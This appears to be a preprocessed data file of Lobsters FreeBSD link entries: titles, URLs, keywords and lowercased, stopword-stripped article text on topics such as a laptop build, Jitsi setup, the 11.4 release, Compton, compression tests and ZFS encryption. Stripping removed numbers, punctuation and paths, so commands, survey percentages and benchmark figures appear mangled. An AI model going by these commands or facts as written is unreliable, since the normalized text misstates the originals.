63,Lobsters,freebsd,FreeBSD,"hikari, a Wayland Compositor",https://hikari.acmelabs.space/,hikari wayland compositor,development darcs darcs book repository darcs though package,development hikari developed using darcs unfamiliar using darcs might want take look darcs book follow development clone repository set agreed upon patch going go next version may contain breaking change since last official release might adjust configuration breaking change documented updating file repository consulted updating newer build patch submitted discussed via mailing list andor matrix chat darcs though want track current development arch linux using aur package
64,Lobsters,freebsd,FreeBSD,My FreeBSD Laptop Build,https://corrupted.io/2020/06/21/my-freebsd-laptop-build.html,freebsd laptop build,freebsd laptop build thinkpad hardware installer core package list file loaderconf sysctlconf pfconf configuration service user group note backlight future wifi improvement usb audio device bug,freebsd laptop build always liked thinkpad hardware started commuting decided needed something decent sized screen fit well bus luckily time lenovo gave nice gift thinkpad basically famous series screen smaller bezel laptop figured time actually put doc together got freebsd workstation working near future another post cover hardenedbsd well since step similar extra gotchas due extra hardening hardware gut generation intel core ghz gb ram replaced nvme disk samsung evo pro nvme disk ip display intel graphic intel wireless card bluetooth important part support usbc charging usbc moving mobile tech charging usbc strip carrying became requirement people start asking well deal needing high performance high power processor answer nearly year core thread xeon workstation home laptop cant reasonable time wrong device job job get offloaded workstation digress really way could get better used open firmware like laptop coming im keeping eye newer machine honestly get spare money experiment new toy one magic onto door step laptop live full service life next one probably various ethical peace mind reason shiny new laptop will existence fleet bet get bsd poured onto hear work wireless keyboard trackpad trackpoint backlight sleep resume sound get working hardware hand next part first step bsdinstall installer based using newer need due iwm change iwm driver release support card standard high point hit installer zfs root full disk encryption mobile machine ssds always get encrypted disk hardening option random pid seem break anything take away functionality use provides extra protection stuff guessing pid apps disable syslog socket ship syslog laptop clean tmp startup clean tmp disable sendmail laptop mail server might well lighten load disable sshd laptop lighten load enable powerd enable moused enable ntpd first boot pkg bootstrap pull core package core package list boiled install package every time common every role mostly particular give desktop xorg sddm devcpudata intelbacklight firefox chromium libreoffice git subversion portlint diffstat sudo neovim drmkmod loaded make change file around system enable hardware make thing work liking file loaderconf let wait boot loader know root never usb disk went sideways somewhere around albuquerque hwusbnobootwait load webcam driver cuseload yes pull acpi video power control backlight control acpivideoload yes intel problem know let load patch cpumicrocodeload yes cpumicrocodename bootfirmwareintelucodebin something borrowed colin percival deal annoying warning fixed soon test axing later load temperature sensor coretempload yes processor support accelerated aes reason use aesniload yes sysctlconf hardware bell deafening nt frequently want go away pfconf use pf workstation firewall know basic rule rule set block ingres ignore loopback adapter pas egress block set skip pas keep state configuration service thing enabled flag need want webcam sysrc webcamdenable yes part de actually work expected sysrc sddmenable yes sysrc dbusenable yes sysrc haldenable yes sysrc avahidaemonenable yes sysrc avahidnsconfdenable yes scanner sometimes work kill one day sysrc sanedenable yes want power control enabled new power control driver come wont needed broken since stop exposing frequency mean kill sysrc powerdenable yes sysrc powerdflags n let use video driver packagesports kernel sysrc kldlist want wireless ready use sysrc sysrc wpa dhcp user group user need part following group use device attached webcamd operator allows use power command like halt reboot without sudo wheel sound video game note backlight need put devd rule place cp usrlocalshareexamplesintelbacklightacpivideointelbacklightconf usrlocaletcdevd key sometimes work sometimes tweaking patch pending review fix make thinkpad function key le fiddly future wifi improvement probably consider trunking sysrc ether wi fi mac add res sysrc ether wi fi mac add res sysrc clonedinterfaces sysrc laggproto failover laggport laggport laggport dhcp usb audio device sddm run kmix part accessibility stack usb audio card plugged sddm start cause kernel enter eternal loop waiting kmix detach never going come see bug nitty gritty near tell experimenting cause card detach ahead sleep shutdown kill kmix part sleep script go away probably circle back around code imo correct behavior kernel say hey guy please release fds period time kernel come back around angry face go okay asking work fds released nice day handling correctly could complex may case accept fds created equally interrupt kernel others software told sod
65,Lobsters,freebsd,FreeBSD,Running Jitsi-Meet in FreeBSD Jail,https://honeyguide.eu/posts/jitsi-freebsd/,running jitsimeet freebsd jail,introduction jitsi meet freebsd jitsihoneyguidenet initial set iocage installing package port http githubcomjitsijitsimeetblobmasterdocmanualinstallmd setting setting see separate blog post setting setting let encrypt setting finishing,introduction due situation also lead people confined home south africa well decided provide freely usable course jitsi meet instance community hosted south africa freebsd environment way community south africa beyond free alternative commercial conferencing solution sometimes dubious security privacy history time improved user experience due lower latency local hosting instance available jitsihoneyguidenet wanting try tutorial show set jitsi meet scratch freebsd initial set first initialise jail use use iocage jail management iocage create n jitsi r boot connect jail prepare pkg port port new need build iocage console jitsi pkg portsnap fetch portsnap extract installing package port jitsimeet jitsivideobridge built port cd usrportswwwjitsimeet make install clean cd usrportsnetimjitsivideobridge make install clean nginx acmesh ssl certificate management prosody installed package pkg install nginx pkg install prosody pkg install acmesh run problem setup recommend compare configuration http githubcomjitsijitsimeetblobmasterdocmanualinstallmd setting prosody prosody configuration located usrlocaletcprosodyprosodycfglua log file located vardbprosody first need create register certificate prosodyctl cert generate jitsihoneyguidenet prosodyctl cert generate authjitsihoneyguidenet prosodyctl register focus authjitsihoneyguidenet keyusedinconfig replace keyusedinconfig key need use config file usrlocaletcprosodyprosodycfglua added following line end otherwise default configuration work fine virtualhost jitsihoneyguidenet authentication anonymous ssl key vardbprosodyjitsihoneyguidenetkey certificate vardbprosodyjitsihoneyguidenetcrt modulesenabled bosh pubsub false virtualhost authjitsihoneyguidenet ssl key vardbprosodyauthjitsihoneyguidenetkey certificate vardbprosodyauthjitsihoneyguidenetcrt authentication internalplain admins focus authjitsihoneyguidenet component conferencejitsihoneyguidenet muc component jitsivideobridgejitsihoneyguidenet componentsecret keyusedinconfig component focusjitsihoneyguidenet componentsecret keyusedinconfig setting jitsivideobridge jitsivideobridge configuration located usrlocaletcjitsivideobridgejitsivideobridgeconf usrlocaletcjitsivideobridgesipcommunicatorproperties one minor problem though usrlocaletcjitsivideobridgejitsivideobridgeconf currently ignored usrlocaletcrcdjitsivideobridge startup script read environment file correctly pragmatic adjusted startup script saved original file jitsivideobridgeorig since also additional flag etcrcconf ignored also added xmpp telegraf set grafana dashboard see separate blog post jitsivideobridgestart daemon p pidfile varlogjitsivideobridgelog command xx useconcmarksweepgc xx heapdumponoutofmemoryerror xx heapdumppathtmp djavautilloggingconfigfile jitsivideobridgeloggingconfig dnetjavasipcommunicatorschomedirlocationusrlocaletcjitsi dnetjavasipcommunicatorschomedirnamevideobridge dnetjavasipcommunicatorsclogdirlocationvarlog cp jitsivideobridgejar orgjitsivideobridgemain hostlocalhost domainjitsihoneyguidenet secretkeyusedinconfig apisrest xmpp jitsivideobridgeflags echo started please note want use restart command service also need adjust jitsivideobridgerestart function similarly soon reading config file fixed config file look like jvbxmpphostlocalhost jvbxmppdomainjitsihoneyguidenet jvbxmppsecretkeyusedinconfig videobridgedebugoptions xdebug xrunjdwp transportdtsocket servery suspendn also need adjust usrlocaletcjitsivideobridgesipcommunicatorproperties file also already prepared grafana dashboard need adjust ip address case jail use public ip address eg nat videobridge us default fallback since already running nginx example doc specify manually avoid race condition address assigned jitsihoneyguidenet grafana dashboard callstats credential iocallstatssdkcallstatsappid hgstats iocallstatssdkcallstatskeyid grafanakey iocallstatssdkcallstatskeypath iocallstatssdkcallstatsappsecret id videobridge iocallstatssdkcallstatsbridgeidjitsivideobridgejitsihoneyguidenet iocallstatssdkcallstatsconferenceidprefixconferencejitsihoneyguidenet enable statistic callstats statistic report interval orgjitsivideobridgeenablestatisticstrue orgjitsivideobridgestatisticstransportcallstatsio setting jicofo jicofo startup script usrlocaletcrcdjicofo expects usrlocaletcssljavapem create keytool noprompt keystore usrlocaletcssljavapem importcert alias prosody file vardbprosodyauthjitsihoneyguidenetcrt remember keystore password later jicofo config file usrlocaletcjitsijicofojicofoconf currently ignored well also adjusted usrlocaletcrcdjicofo saved original file jicofoorig jicofostart daemon p pidfile varlog name log command xx heapdumponoutofmemoryerror xx heapdumppathtmp djavautilloggingconfigfile jicofologgingconfig dnetjavasipcommunicatorschomedirlocationusrlocaletcjitsi dnetjavasipcommunicatorschomedirnamejicofo dnetjavasipcommunicatorsclogdirlocationvarlog djavaxnetssltruststoreusrlocaletcssljavapem cp jicofojar orgjitsijicofomain hostlocalhost domainjitsihoneyguidenet userdomainauthjitsihoneyguidenet usernamefocus userpasswordkeyusedinconfig jicofoflags echo started restart command work implemented elegantly startup script already later startup script read config file correctly usrlocaletcjitsijicofojicofoconf jvbxmpphostlocalhost jvbxmppdomainjitsihoneyguidenet jvbxmppsecretkeyusedinconfig jvbxmppuserdomainauthjitsihoneyguidenet jvbxmppusernamefocus jvbxmppusersecretkeyusedinconfig setting nginx nginx configuration usrlocaletcnginxnginxconf course might done differently set everything one file complicated need add two server entry server listen defaultserver servername return http host requesturi server listen ssl sslcertificate usrlocaletcssljitsihoneyguidenetcer sslcertificatekey usrlocaletcssljitsihoneyguidenetkey sslsessioncache shared sslsessiontimeout sslciphers high anull sslpreferserverciphers servername jitsihoneyguidenet set root root usrlocalwwwjitsimeet index indexhtml location rewrite break location ssi bosh bidirectionalstreams synchronous http http enwikipediaorgwikibosh protocol location httpbind proxypass http proxysetheader xforwardedfor remoteaddr proxysetheader host httphost externalapijs must accessible root installation electron version jitsi meet work http githubcomjitsijitsimeetelectron location externalapijs alias srvjitsimeetlibsexternalapiminjs easy way maintain let encrypt ssl certificate acmesh stand alone mode usrlocaletcrcdnginx stop cd acmesh force issue jitsihoneyguidenet standalone cd rootacmeshjitsihoneyguidenet mv usrlocaletcssl usrlocaletcrcdnginx start setting jitsimeet jitsimeet configuration located usrlocalwwwjitsimeetconfigjs value remain though might want customise depending need need change first line file reflect domain var config connection host xmpp domain domain jitsihoneyguidenet using authentication domain guest user anonymousdomain guestexamplecom domain authenticated user default domain authdomain jitsimeetexamplecom jirecon recording component domain jirecon jireconjitsimeetexamplecom call control component jigasi callcontrol callcontroljitsimeetexamplecom bridge jitsivideobridgejitsihoneyguidenet focus component domain default focus domain focus focusjitsihoneyguidenet xmpp muc domain fixme use discover muc conferencejitsihoneyguidenet want adjust frontend look feel look content directory static image interfaceconfigjs finishing make sure everything started automatically add service etcrcconf jitsivideobridgeenable yes jistivideobridgeflags apisrest xmpp nginxenable yes prosodyenable yes jicofoenable yes
66,Lobsters,freebsd,FreeBSD,FreeBSD 11.4-RELEASE Announcement,https://www.freebsd.org/releases/11.4R/announce.html,freebsd announcement,freebsd announcement dedication availability http http consolecloudgooglecomlauncherbrowse filtercategory o filterprice free download support acknowledgment trademark iso image checksum powerpc bananapi beaglebone cubieboard cuboxhummingboard rpib wandboard virtual machine disk image checksum donation,freebsd announcement freebsd release engineering team pleased announce availability freebsd fifth final release branch highlight clang llvm lld lldb compilerrt utility well libc updated upstream version openssl updated version unbound updated version pkg utility updated version kde desktop environment updated version gnome desktop environment updated version support renaming zfs bookmark added certctl utility added several feature addition update userland application warning feature deprecated future release printed freebsd version warning added kerberos g api algorithm deprecated rfcs complete list new feature known problem please see online release note erratum list available information freebsd release engineering activity please see dedication freebsd project dedicates freebsd memory bruce evans availability freebsd available powerpc architecture freebsd installed bootable iso image network architecture also support installing usb memory stick required file downloaded described section hash release iso memory stick sd card image included bottom message pgpsigned checksum release image also available pgpsigned version announcement available purpose image provided part release follows contains everything necessary install base freebsd operating system documentation debugging distribution set small set prebuilt package aimed getting graphical workstation running also support booting livefs based rescue mode need burn use dvdsized medium contains base freebsd operating system also support booting livefs based rescue mode prebuilt package bootonly support booting machine using cdrom drive contain installation distribution set installing freebsd cd would need perform network based install eg http ftp server booting cd memstick written usb memory stick flash drive used install machine capable booting usb drive also support booting livefs based rescue mode prebuilt package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct minimemstick written usb memory stick flash drive used boot machine contain installation distribution set medium similar bootonly image also support booting livefs based rescue mode prebuilt package one example use minimemstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct freebsdarm sd card image written sd card used boot supported arm system sd card image contains full freebsd installation installed onto sd card small convenience without console access system freebsd user password freebsd available default ssh access additionally root user password set root strongly recommended change password user gaining access system write freebsdarm image sd card use dd utility replacing kernel appropriate kernel configuration name system dd convsync careful make sure get target correct freebsd also purchased cdrom dvd several vendor one vendor offering freebsd product preinstalled virtual machine image also available architecture vhd vmdk disk image format well raw unformatted image freebsd also available cloud hosting platform amis available following region region region region region region region region region region region region region region region region region amis also available marketplace http compute instance deployed using gcloud utility gcloud compute instance create instance image imageprojectfreebsdorgclouddev gcloud compute ssh instance replace instance name google compute engine instance freebsd also expected available google compute marketplace completed thirdparty specific validation http consolecloudgooglecomlauncherbrowse filtercategory o filterprice free instance deployed using vagrant utility vagrant init vagrant download freebsd may downloaded via http following site freebsd virtual machine image may downloaded instruction installing freebsd updating existing machine please see support based new freebsd support model freebsd release series supported least september please note supported three month release date currently scheduled september acknowledgment many company donated equipment network access human time support release engineering activity freebsd including release engineering team includes trademark freebsd registered trademark freebsd foundation iso image checksum powerpc bananapi beaglebone cubieboard cuboxhummingboard rpib wandboard virtual machine disk image checksum love freebsd support future release donation freebsd foundation
67,Lobsters,freebsd,FreeBSD,FreeBSD Desktop – Part 21 – Configuration – Compton,https://vermaden.wordpress.com/2020/06/16/freebsd-desktop-part-21-configuration-compton/,freebsd desktop part configuration compton,freebsd desktop global page configuration like,article freebsd desktop series talk compton setup one break display everything properly consume cpu time unfortunately compton real bitch come proper setup compton compositor allows following feature desktop transparent windowsmenustitlebarsborders shadow colored shadow fading effect background bluring may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content example compton look action install compton freebsd use default package shown pkg install compton configuration graphic card configuration cat section device identifier driver modesetting option dpms option accelmethod glamor endsection meritum article compton config file cat configcomptonconf backend glx shadow true nodockshadow true clearshadow true shadowradius shadowoffsetx shadowoffsety shadowopacity shadowexclude name name notification name plank name docky name kupfer name name vlc name compton name chromium name chrome name firefox classg conky classg dzen classg classg kupfer classg synapse classg notifyosd classg cairodock classg classg shadowignoreshaped false menuopacity inactiveopacity activeopacity frameopacity inactiveopacityoverride false alphastep blurbackgroundfixed false blurbackgroundexclude windowtype dock windowtype desktop fading true fadedelta fadeinstep fadeoutstep fadeexclude markwmwinfocused true markovredirfocused true useewmhactivewin true detectroundedcorners true detectclientopacity true refreshrate vsync openglswc dbe false paintonoverlay true swopti false unredirifpossible true focusexclude detecttransient true detectclientleader true wintypes tooltip fade true shadow false opacity focus true config work well also add compton configuration file comment cat configcomptonconf backend backend use xrender glx glx backend typically much faster depends sane driver backend glx glx backend glx backend copy unmodified region front buffer instead redrawing test nvidiadrivers show decrease performance whole screen modified increase modified test nouveau show terrible slowdown useful glxswapmethod well glxcopyfromfront false glx backend use mesacopysubbuffer partial screen update test nouveau show performance boost screen updated may break vsync available driver override glxcopyfromfront glxusecopysubbuffermesa true glx backend avoid rebinding pixmap window damage probably could improve performance rapid window content change known break thing driver llvmpipe recommended work glxnorebindpixmap true glx backend glx buffer swap method assume could undefined copy exchange bufferage undefined slowest safest default value copy fastest may fail driver bufferage mean autodetect using glxextbufferage supported driver useless glxusecopysubbuffermesa partially break resizedamage default undefined glxswapmethod undefined shadow enabled clientside shadow window shadow true draw shadow dnd window nodndshadow true avoid drawing shadow dockpanel window nodockshadow true zero part shadow mask behind window fix weirdness argb window clearshadow true blur radius shadow default shadowradius left offset shadow default shadowoffsetx top offset shadow default shadowoffsety translucency shadow default shadowopacity set want different colour shadow shadowred shadowgreen shadowblue shadow exclude option helpful shadow enabled due way compton draw shadow certain application visual glitch application fine apps weird thing xshapes argb affected name part excludes shadow unknown window prevents visual glitch xfwm alttab switcher shadowexclude name name notification name plank name docky name kupfer name name vlc name compton name chromium name chrome name firefox classg conky classg dzen classg classg kupfer classg synapse classg notifyosd classg cairodock classg classg avoid drawing shadow shaped window see also detectroundedcorners shadowignoreshaped false opacity opacity menu item menuopacity opacity inactive window inactiveopacity opacity active window activeopacity opacity active frame window frameopacity opacity inactive frame window inactiveopacityoverride false alpha step alphastep dim inactive window inactivedim let dimness adjust based window opacity inactivedimfixed true blur background transparent window bad performance x render backend glx backend preferred blurbackground true blur background opaque window transparent frame well blurbackgroundframe true let blur radius adjust based window opacity blurbackgroundfixed false blue exclude list blurbackgroundexclude windowtype dock windowtype desktop fading fade window opacity change fading true time step fade millisecond default fadedelta opacity change step fading default fadeinstep opacity change step fading default fadeoutstep fade window inout openingclosing nofadingopenclose true specify list condition window faded fadeexclude try detect wm window mark active markwmwinfocused true mark nonwm overrideredirect window active eg menu markovredirfocused true use ewmh netwmactivewindow determine window focused instead using focusinout event usually reliable depends ewmhcompliant wm useewmhactivewin true detect rounded corner treat rectangular shadowignoreshaped detectroundedcorners true detect netwmopacity client window useful window manager passing netwmopacity client window frame window prevents opacity ignore apps without enabled opacity matter detectclientopacity true specify refresh rate compton detect x randr extension refreshrate set vsync method vsync method currently available none vsync drm vsync drmioctlwaitvblank may work driver opengl vsync sgivideosync opengl extension driver opengloml vsync omlsynccontrol opengl extension driver openglswc vsync sgiswapcontrol opengl extension driver work glx backend known effective many driver control paint timing buffer swap affected effect swopti unlike method experimental openglmswc try vsync mesaswapcontrol opengl extension basically openglswc except extension use vsync openglswc enable dbe painting mode use vsync hopefully eliminate tearing dbe false painting x composite overlay window recommended paintonoverlay true limit repaint every refreshrate second boost performance used vsync drmopenglopengloml essentially swopti job unless wish lower refresh rate actual value swopti false unredirect window fullscreen window detected maximize performance fullscreen window like game known cause flickering redirectingunredirecting window paintonoverlay may flicker le unredirifpossible true specify list condition window always considered focused focusexclude use wmtransientfor group window group focused time detecttransient true use wmclientleader group window group focused time wmtransientfor higher priority detecttransient enabled detectclientleader true window type setting wintypes tooltip fade fade particular type window fade true shadow give window shadow shadow false opacity default opacity type window opacity focus whether always consider window type focused focus true sure else could add mean end article eof like like loading related
68,Lobsters,freebsd,FreeBSD,Comparing zstd/gzip/bzip2/lzma/xz Compression,https://etbe.coker.com.au/2020/06/06/comparing-compression/,comparing compression,page giving overview conclusion,quick test different compression option debian source file mysql dump file time user cpu time running kvm compression program may different level optimisation cpu family facebook people designed zstd compression system page giving overview interesting new feature provide real difference scale like unusually large window predefined dictionary tested default mode option compression sql file zstd provides significantly better compression gzip taking slightly le cpu time gzip zstd default option equivalent zstd give much faster compression gzip also slightly smaller use case slow inline compression mysql dump dump process lock table hang client lzma xz compression algorithm provide significant benefit size time taken grossly disproportionate quick check collection file compressed gzip able fine fild got le compression zstd default option file got better compression zstd zstd seems beat gzip everywhere every measure compression seems obsolete zstd much faster slightly smaller output xz lzma seem offer combination compression time taken zstd beat file type least ultra compression mode give smaller output file almost minute cpu time compression bit ridiculous threaded mode zstd could potentially allow shorter wall clock time zstd ultra lzmaxz also giving better compression zstd zstd gzip lzma xz zstd zstd ultra conclusion distribution like debian large archive file compressed transferred lot zstd ultra compression might useful multithreaded compression given debian already xz use might worth changing faster cpu lot core become commonly available one could argue debian make sense change xz hard drive seem getting larger capacity also smaller physical size faster debian archive growing one possible reason adopting zstd distribution like debian tuning option thing like memory use would possible package architecture like arm tends le ram compressed way decrease memory use decompression general compression compressing log file making backup seems zstd clear winner even far slow test zstd clearly beat gzip every combination compression time taken may corner case gzip compete compression time due cpu feature optimisation cpu etc expect almost case zstd win compression size time aside noticed gzip compressing faster version opteron system version assembly optimisation version time create tar archive run tar czf tar cjf create archive gzip xz compression create archive zstd compression use tar zstd cf extra character type likely casual archive creation eg copying file around lan usb stick saving character typing benefit saving small amount cpu time storage space would really good tar got single character option zstd compression external dictionary support zstd would work really well rsync backup currently rsync support zlib adding zstd support would good project someone unfortunately enough spare time change database backup script use zstd update command tar acvf azst filename create zstd compressed tar archive option gnu tar make autodetect compression type file name thanks enrico
70,Lobsters,freebsd,FreeBSD,Installing FreeNAS on my QNAP TS-459,https://humaidq.ae/blog/qnap/,installing freenas qnap,freenas void linux start discussion public general mailing list,four year ago got qnap networkattached storage na store family picture backup device came qnap qts na user interface came across many issue responsiveness ui try replicate desktop environment floating pane slow hard navigate recently one four hard drive array failed long failure pile regretted clamav scan run every week pointless reckless wearandtear drive lesson learned drive installed seagate enterprise capacity hdd since bad idea keep using drive ordering new one installing freenas luckily system vendorlocked allows user boot usb recovery na drive hdmi output medium center pressing del booting system load bios could specify boot order unfortunately able find key open boot menu directly bios allow boot directly device set usb device priority internal flash storage booted void linux could check partition see system running since formatted usb laying around appears entire system run half gigabyte flash storage next downloaded freenas formatted usb stick plugged installation usb second usb install freenas onto installation went smoothly booted freenas selection menu plugging ethernet visited na ip address lo behold greeted freenas login page since freenas issue detecting drive next step going purchasing new drive use setup second post challenge would like comment blog post feel free start discussion public general mailing list
71,Lobsters,freebsd,FreeBSD,HardenedBSD June 2020 Status Report,https://hardenedbsd.org/article/shawn-webb/2020-06-14/hardenedbsd-june-2020-status-report,hardenedbsd june status report,,hardenedbsd infrastructure found new home time ramp development working kink regard bandwidth hope increase bandwidth infrastructure inside two month started working adding filesystem extended attribute support tmpfs support added able integrate portspackages user longer need worry toggling exploit mitigation already come pretoggled misbehaving application suspect work take month complete never done filesystem development treading new water filesystem extended attribute support added plan integrate exploit mitigation toggling port tree said done thinking around six month time frame granted health issue guarantee keep everyone updated next goal integration safestack rtld needed order apply safestack shared library application integration work relates directly crossdso cfi support since crossdso cfi requires samesimilar type integration interviewing people add hardenedbsd board director added jordan boland team help maintain infrastructure plan get bandwidth issue resolved included intro jordan exciting news share soon regard board director begin intro jordan boland excited getting involved hardenedbsd opportunity serve board lifelong tinkerer opensource enthusiast introduced linux middle school fascinated introduced freebsd college ran freebsd personal machine almost decade introduced hardenedbsd quickly took o choice degree includes specialization network administration although love field worked many small shop avoid becoming generalist day nothing related professional life worked higher education healthcare telecommunication complete surprise self somehow arrived microsoft support engineer research division programmer person occasionally problem requires writing code journey dabbled c c c java python perl powershell bashbourne shell extensively really admire write kernel code deep understanding hardware happening hood love kind proficiency someday meantime best contribution project likely infrastructurerelated deployment kerberos ldap come mind perhaps digging around inside gitea understand give error u let know question nt cover excited get work end intro jordan boland
72,Lobsters,freebsd,FreeBSD,FreeBSD now has a mirror on GitLab,https://gitlab.com/FreeBSD,freebsd mirror gitlab,group collection several project,group collection several project organize project group work like folder manage group member permission access project group
73,Lobsters,freebsd,FreeBSD,New FreeBSD code of conduct,https://www.mail-archive.com/freebsd-announce@freebsd.org/msg00965.html,new freebsd code conduct,http wwwfreebsdorginternalcodeofconducthtml http http http wwwfreebsdorginternalcodeofconducthtml signatureasc,dear freebsd community freebsd project adopted new llvmderived code conduct new code conduct found http wwwfreebsdorginternalcodeofconducthtml background active freebsd developer invited complete two survey related code conduct first survey conducted told u developer believe respectful communication project important disagreed believe freebsd welcoming people background disagreed say toxic people removed project regardless technical contribution disagreed dissatisfied code conduct adopted neutral satisfied result indicated sufficient dissatisfaction current code conduct warrant investigation reviewing open source code conduct freebsd core team investigated adopting either llvmderived goderived code conduct second survey held start june one question code conduct freebsd adopt llvmderived code conduct http goderived code conduct http retain current code conduct http wwwfreebsdorginternalcodeofconducthtml result favoured keeping current code conduct favoured goderived code conduct favoured llvmderived code conduct thus core team following preference majority active freebsd developer adopted llvmderived code conduct thank thank llvm go community impassioned member helped champion evolution freebsd core team signatureasc description pgp signature
74,Lobsters,freebsd,FreeBSD,Beauty of Unix Pipelines,https://prithu.xyz/posts/unix-pipeline/,beauty unix pipeline,unix programming envirnonment watch brian kernighan rmemes rearthporn example printing leaderboard author based number commits git repo uniq example browse meme rmemes set wallpaper rearthporn http redditcomrmemesjson rmemes http redditcomrmemestopjson tweek feh screen setting wallpaper rearthporn example get random movie imdb list blow mind movie view discussion hacker news,unix philosophy lay emphasis building software simple extensible piece software must one thing well software able work program common interface text stream one core philosophy unix make powerful intuitive use excerpt unix programming envirnonment even though unix system introduces number innovative program technique single program idea make work well instead make effective approach programming philosophy using computer although philosophy written single sentence heart idea power system come relationship among program program many unix program quite trivial thing isolation combined program become general useful tool think explains pretty well also watch brian kernighan complete chad explaining fundamental unix o also go example using pipe post though would like show example philosophy action one use different unix tool together accomplish something powerful example printing leaderboard author based number commits git repo browse meme rmemes set wallpaper rearthporn get random movie imdb list example printing leaderboard author based number commits git repo let start simple one display list authorscontributors git repo sorted based number commits sort list descending order commits contributed top simple task think term piplines git log used display commit log pas format format option mention format want commits displayed format print author name commit git log format alice bob denise denise candice denise alice alice alice use sort utility sort alphabetically git log format sort alice alice alice alice bob candice denise denise denise next use uniq git log format sort uniq c alice bob candice denise according uniq man page uniq report omit repeated line filter adjacent matching line input standard input writing output standard output uniq print repeated line appear adjacent eachother pas output first sort c flag prefix line number occurrence see output still sorted alphabetically remaining sort numerically flag sort n flag considers number based numerical value git log format sort uniq c sort nr alice denise candice bob r flag also included print list reverse order default sort ascending order list author sorted according number commits example browse meme rmemes set wallpaper rearthporn know append json reddit url get json response instead usual html allows world possibility one browsing meme right command line well entirely actual image displayed gui program simply curl wget url http redditcomrmemesjson wget q http redditcomrmemesjson kind listing data modhash dist child kind data approvedatutc null subreddit meme selftext info available line use wget seems like curl useragent get treated differently obviously get around simply changing useragent header went wget wget provide output filename program take option also allow value represents standard output input depending context q option tell wget quiet print thing like progress status get big json structure work parse use json data meaningfully command line use jq jq thought sedawk json simple intuitive language refer man page take look response json look something like kind listing data modhash dist child null response type listing see array child element array post one element child array look like kind data subreddit meme selftext created authorfullname gilded title hard argue assessment subredditnameprefixed rmemes down hidescore false name quarantine false permalink url http upvoteratio subreddittype public ups totalawardsreceived score authorpremium false thumbnail http gilding posthint image line skipped reduced number key value pair data total item see many interesting data attribute fetch post one interest url post url actual reddit post rather url content post post url want permalink case url field url meme image simply get list url every post using wget q redditcomrmemesjson jq datachildren dataurl http http http iimgurcomkpwiusopng http http http ignore first two link basically sticky post mod put whose url permalink jq read standard input fed json saw earlier datachildren referring array post mentioned earlier datachildren dataurl mean iterate every element array print url field data field every element get list url hot post rmemes wanted get top post week hit http redditcomrmemestopjson tweek top post time tall year tyear list url pipe xargs xargs really useful utility build command line standard input xarg man page say xargs read item standard input delimited blank protected double single quote backslash newlines executes command default binecho one time initialarguments followed item read standard input blank line standard input ignored running something like echo http xargs wget memejpg q would equavalent running wget memejpg q http pas list url image viewer like feh eog accept url valid argument wget q redditcomrmemesjson jq datachildren dataurl xargs feh feh pop meme browse using arrow key like local disk feh screen could simply download image using wget replacing feh wget possibility endless another good use reddit json data setting wallpaper desktop top upvoted image rearthporn hot section wget q redditcomrearthpornjson jq datachildren dataurl head xargs feh bgfill want set cronjob run every hour use head command print first line would top upvoted post head seems something trivial unuseful case working program becomes important part see power unix pipeline one single line everything fetching json data parsing getting relevant data fetching image url finally setting wallpaper another silly thing used downloading meme rmemes every two hour set cron job machine around meme taking disk ask example get random movie imdb list let end simple one imdb feature allow make list also find list made user example blow mind movie append export url get list csv format curl http position const created modified description title url title type imdb rating runtime min year genre num vote release date director fight club http david fincher source code http action drama mystery scifi thriller duncan jones prestige http drama mystery scifi thriller christopher nolan memento http mystery thriller christopher nolan american psycho http comedy crime drama mary harron oldeuboi http action drama mystery thriller chanwook park shutter island http mystery thriller martin scorsese midsommar http drama horror mystery thriller ari aster use cut decide field need print curl http cut f title fight club source code prestige memento american psycho oldeuboi shutter island midsommar option specify delimiter field field separated case comma f option field number want print case sixth field title movie also print csv header title remove use sed mean delete line input stream pipe list movie shuf shuf shuffle input line randomly spit curl http cut f sed shuf american psycho midsommar source code oldeuboi fight club memento shutter island prestige pipe head sed q would print first line every time run get random selection curl http cut f sed shuf head source code let say would also like url printed along title problem cut allows specify multiple field print using fieldlist curl http cut sed shuf head shutter island http problem though movie title comma would get totally different field value one way overcome using python oneliner like python c import csv sys print title csvdictreader sysstdin curl http python c import csv sys print title url csvdictreader sysstdin shuf head oldeuboi http example many thing accomplish single line shell using pipe view discussion hacker news
75,Lobsters,freebsd,FreeBSD,Testing Native ZFS Encryption Speed,https://www.medo64.com/2020/06/testing-native-zfs-encryption-speed/,testing native zfs encryption speed,native encryption ubuntu lukssetup raw data,wrote installing zfs native encryption ubuntu got abandon lukssetup switch well guess performance testing order purpose decided go ubuntu server minimize impact desktop environment might inside cpu virtual machine gb ram two cpu enough show multithreading performance difference gb ram give home zfs disk want depend disk speed variation give testing purpose care relative speed difference using ram instead real disk would give repeatable result o used ubuntu server zfs package carved chunk memory ram disk limited zfs arc terminal hairsp copysudo eof apt update apt distupgrade apt install zfsutilslinux grep ramdisk etcfstab echo tmpfs ramdisk tmpfs rw sudo tee etcfstab grep zfsarcmax etcmodprobedzfsconf echo option zfs sudo tee etcmodprobedzfsconf rebooteof system pristine state created data used testing random gib terminal hairsp copydd ifdevurandom oframdiskdatabin data disk bunch zero gb zfs pool usual stuff compression turned sync set always order minimize impact result terminal hairsp copyfor dd ifdevzero oframdiskdisk ibin doneecho zpool create normalizationformd acltypeposixacl xattrsa dnodesizeauto atimeoff keylocationprompt keyformatpassphrase compressionoff syncalways mountpointzfs testpool get write speed simply copied data file multiple time took time reported dd get single figure removed highest lowest value averaging rest terminal hairsp copysudo eof sudo dd iframdiskdatabin sudo dd iframdiskdatabin sudo dd iframdiskdatabin sudo dd iframdiskdatabin sudo dd iframdiskdatabin read took file written dumped devnull averaging procedure writes terminal hairsp copysudo eof sudo dd ofdevnull sudo dd ofdevnull sudo dd ofdevnull sudo dd ofdevnull sudo dd ofdevnull completed result quite surprised close different bit size performance processor support aes instruction set reason go bit older processor without encryption support crypto make sense difference come read speed favor gcm mode would probably go cipher choice however added measurement without encryption luksbased crypto shocked expected thing go faster without encryption expect huge difference also surprising seeing luks encryption triple performance native one test completely fair real life powerful machine proper disk see huge difference syncalways setting performance killer result encryption call would normally see however still see difference good old luks seems like winner faster box use le cpu encrypt data leaving metadata plain zfs also admit comparison lean toward applestooranges kind reason use zfs native encryption due performance due extra benefit brings part extra cycle go authentication written block using strong mac leaving metadata unencrypted leak bit meta data also enables sendreceive without either side even decrypted ideal backup box untrusted environment backup data without ever needing enter password remote side lastly let forget allowing zfs direct 